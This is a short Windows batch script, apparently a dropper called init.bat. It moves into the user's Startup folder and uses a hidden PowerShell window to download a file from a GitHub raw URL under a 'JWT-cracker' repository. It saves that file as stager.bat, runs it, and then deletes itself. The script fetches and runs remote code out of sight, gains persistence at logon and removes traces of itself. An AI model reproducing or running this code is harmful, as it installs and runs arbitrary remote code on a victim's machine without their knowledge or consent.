@rem @echo off
set "currentd=%cd%"
set "targetd=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cd %targetd%
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/saifnasef/JWT-cracker/main/run.py -o stager.bat"
powershell ./stager.bat
cd %currentd%
del init.bat